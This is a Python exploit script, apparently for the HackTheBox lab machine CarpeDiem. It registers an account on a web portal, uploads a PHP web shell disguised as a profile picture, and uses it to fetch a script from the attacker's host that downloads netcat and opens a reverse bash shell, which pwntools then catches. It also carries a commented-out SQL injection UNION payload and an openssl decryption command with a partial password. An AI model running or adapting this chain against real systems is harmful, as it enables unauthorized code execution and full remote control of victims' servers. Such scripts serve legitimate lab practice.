```openssl enc -d -aes-256-cbc -salt -pbkdf2 -in exploit.py.enc -out exploit.py```

Pass: J5tnqs...

```python
from pwn import *
import requests
import netifaces as ni
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

login = "http://portal.carpediem.htb/classes/Login.php?f=login_user"
sess = requests.Session()
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

def start_server():
    httpd = HTTPServer(('', 80), SimpleHTTPRequestHandler)
    httpd.serve_forever()
t = threading.Thread(target=start_server)
t.daemon=True
t.start()

sh = open('shell.sh', 'w+')
pl = f"curl {ip}/nc -o /tmp/nc\n"
pl += "chmod +x /tmp/nc\n"
pl += f"/tmp/nc {ip} 4444 -e /bin/bash"
sh.write(pl)
sh.close()

#payload = "http://portal.carpediem.htb:80/?p=bikes&s=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a7671%2CIFNULL%28CAST%28avatar%20AS%20CHAR%29%2C0x20%29%2C0x7176786271%29%2CNULL%20FROM%20portal.users--%20-"

data = {
        'firstname':'aid',
        'lastname':'aid',
        'contact':'aid',
        'gender':'Female',
        'address':'aid',
        'username':'aid',
        'password':'aid',
        'login_type':'1'
        }

sess.post("http://portal.carpediem.htb/classes/Master.php?f=register", data=data)

data = {"username":"aid", "password":"aid"}
sess.post(login, data=data)

phpsessid = sess.cookies.get_dict()
phpsessid = phpsessid.get('PHPSESSID')

cookies = {'PHPSESSID': phpsessid}
headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------7835878819075197321776660336'}

data = '-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="id"\r\n\r\n25\r\n-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="firstname"\r\n\r\naid\r\n-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="lastname"\r\n\r\naid\r\n-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="username"\r\n\r\naid\r\n-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="password"\r\n\r\n\r\n-----------------------------7835878819075197321776660336\r\nContent-Disposition: form-data; name="file_upload"; filename="pic.php"\r\nContent-Type: application/x-php\r\n\r\n<?php echo "<pre>"; system($_GET[cmd]); ?>\r\n\r\n-----------------------------7835878819075197321776660336--\r\n'

r=requests.post('http://portal.carpediem.htb/classes/Users.php?f=upload', cookies=cookies, headers=headers, data=data)

path = r.text[12:-11]
path = path.replace("\\","")

def shellStart():
    context.log_level = 'debug'
    r = listen(4444, timeout=10).wait_for_connection()
    r.sendline(b"whoami")
    r.interactive()
e = threading.Thread(target=shellStart)
e.start()

uri = f"http://portal.carpediem.htb/{path}?cmd=curl http://{ip}/shell.sh|sh"
requests.get(uri)

#cmd = f"curl http://portal.carpediem.htb/{path}?cmd=curl%20http://{ip}/shell.sh%7Csh &"
#os.system(cmd)
```
